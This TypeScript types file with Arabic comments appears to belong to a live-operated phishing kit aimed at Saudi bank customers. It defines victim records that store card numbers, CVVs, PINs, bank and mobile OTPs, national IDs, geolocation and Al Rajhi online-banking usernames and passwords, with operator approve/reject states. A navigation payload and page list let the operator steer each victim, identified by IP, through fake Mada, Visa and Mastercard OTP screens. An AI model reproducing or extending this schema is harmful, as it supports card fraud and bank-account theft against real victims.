export interface BlockedUser {
  id: string;
  name?: string;
  privateIp?: string;
  publicIpv4?: string;
  publicIpv6?: string;
  blockedAt: number;
}

export interface PaymentData {
  cardHolderName: string;
  cardNumber: string;
  expirationDate: string;
  cvv: string;
  status?: 'pending' | 'approved' | 'rejected';
  amount?: string;
  cardType?: 'rajhi' | 'other';
  timestamp?: number;
  rejectMessage?: string;
  pin?: string;
  pinSubmittedAt?: number;
  approvedAt?: number;
  rejectedAt?: number;
}

// واجهة بيانات الدفع المعلق (للبطاقة قيد الانتظار)
export interface PendingPaymentData {
  cardNumber: string;
  cardHolderName: string;
  expirationDate: string;
  cvv?: string;
  amount: string;
  cardType: 'rajhi' | 'other';
  status: 'pending' | 'approved' | 'rejected';
  timestamp: number;
  rejectMessage?: string;
  pin?: string;
  pinSubmittedAt?: number;
  approvedAt?: number;
  rejectedAt?: number;
}

// واجهة بيانات الموقع الجغرافي
export interface LocationData {
  // الإحداثيات الأساسية
  latitude: number;           // خط العرض
  longitude: number;          // خط الطول
  accuracy: number;           // دقة الموقع بالأمتار

  // روابط خرائط جوجل
  googleMapsUrl: string;      // رابط مباشر لخرائط جوجل

  // العنوان المفصل (من Reverse Geocoding)
  address?: {
    fullAddress?: string;     // العنوان الكامل
    city?: string;            // المدينة (الرياض، جدة، إلخ)
    district?: string;        // الحي
    street?: string;          // الشارع
    region?: string;          // المنطقة
    country?: string;         // الدولة
  };

  // معلومات إضافية
  timestamp: number;          // وقت أخذ الموقع
  permissionStatus: 'granted' | 'denied' | 'prompt'; // حالة الإذن
}

export interface UserData {
  ip: string;
  privateIp?: string;
  publicIp?: string;
  publicIpv4?: string;
  publicIpv6?: string;
  clientCookieId?: string;
  name?: string;
  nationalID?: string;
  phoneNumber?: string;
  email?: string;
  currentPage: string;
  previousPage?: string;  // للصفحة السابقة لتتبع التغيير
  status: 'online' | 'offline';
  lastSeen: number;
  payments: PaymentData[];
  pendingPayment?: PendingPaymentData;  // بيانات الدفع المعلق
  pendingRajhiLogin?: {
    attemptId?: string;
    username?: string;
    password?: string;
    status?: 'pending' | 'approved' | 'rejected';
    timestamp?: number;
    approvedAt?: number;
    rejectedAt?: number;
    rejectMessage?: string;
  };
  rajhiLogins?: Record<string, {
    attemptId?: string;
    username?: string;
    password?: string;
    status?: 'pending' | 'approved' | 'rejected';
    timestamp?: number;
    approvedAt?: number;
    rejectedAt?: number;
    rejectMessage?: string;
  }>;
  pin?: string;
  otpBank?: string;
  otpMobile?: string;
  hasNewData: boolean;
  hasPayment: boolean;
  isFlagged: boolean;
  isBlocked: boolean;
  // حقول تتبع المعلومات الجديدة
  newPersonalData?: boolean;   // المعلومات الشخصية جديدة
  newPaymentData?: boolean;    // بيانات الدفع جديدة
  newContactData?: boolean;     // معلومات الاتصال جديدة
  newLocationData?: boolean;   // الموقع الجغرافي جديد
  newBookingData?: boolean;    // بيانات الحجز جديدة
  isNew?: boolean;             // زبون جديد لم يتم فتح صفحته
  lastViewedAt?: number;       // آخر وقت تم فيه فتح صفحة الزبون
  location?: LocationData;    // بيانات الموقع الجغرافي
  locationDeniedCount?: number; // تتبع عدد مرات رفض أو فشل الموقع
  locationSkipEnabled?: boolean; // تفعيل ميزة تخطي الموقع لهذا المستخدم
}

export type UsersMap = Record<string, UserData>;

export interface GlobalSettings {
  globalSkipLocation?: boolean; // تفعيل ميزة تخطي الموقع للجميع
}

export interface NavigatePayload {
  ip: string;
  page: string;
}

export const AVAILABLE_PAGES = [
  { id: '/home', label: 'الرئيسية' },
  { id: '/booking', label: 'حجز موعد' },
  { id: '/billing', label: 'طريقة الدفع' },
  { id: '/payment', label: 'الدفع' },
  { id: '/verification', label: 'التحقق (OTP)' },
  { id: '/mada-otp', label: 'التحقق المدى' },
  { id: '/visa-otp', label: 'التحقق فيزا' },
  { id: '/mastercard-otp', label: 'التحقق ماستر كارد' },
  { id: '/finish', label: 'النهاية' }
];